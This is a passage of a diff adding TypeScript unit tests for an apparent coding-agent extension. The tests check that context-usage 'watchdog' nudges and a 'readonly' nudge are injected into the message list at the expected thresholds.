+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 45 }) },
+	);
+	assert.notEqual(first, undefined);
+	assert.equal(first.messages[1].customType, "agenticoding-watchdog");
+
+	// Second call: 55% → band 1 (crossed bands), should nudge again
+	const second = await handler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 2 }] },
+		{ getContextUsage: () => ({ percent: 55 }) },
+	);
+	assert.notEqual(second, undefined);
+	assert.equal(second.messages[1].customType, "agenticoding-watchdog");
+});
+
+test("readonly nudge and watchdog nudge merge in same context turn", async () => {
+	const pi = new MockPi();
+	registerAgenticoding(pi as any);
+
+	// Toggle readonly ON
+	await pi.commands.get("readonly")!.handler("", {
+		hasUI: true,
+		ui: {
+			notify: () => {},
+			theme: { fg: (_n: string, t: string) => t },
+			setStatus: () => {},
+			setWidget: () => {},
+		},
+		getContextUsage: () => null,
+	});
+
+	const [contextHandler] = pi.handlers.get("context")!;
+	const result = await contextHandler(
+		{ messages: [{ role: "user", content: "hi", timestamp: 1 }] },
+		{ getContextUsage: () => ({ percent: 70 }), sessionManager: { getBranch: () => [] } },
+	);
+
+	// Both nudges should be present in the result
+	assert.ok(result.messages.length >= 3, `expected >= 3 messages, got ${result.messages.length}`);
+	const customTypes = result.messages
+		.filter((m: any) => m.role === "custom")
+		.map((m: any) => m.customType);
+	assert.ok(customTypes.includes("agenticoding-readonly-nudge"), "should include readonly nudge");
+	assert.ok(customTypes.includes("agenticoding-watchdog"), "should include watchdog nudge");
 });
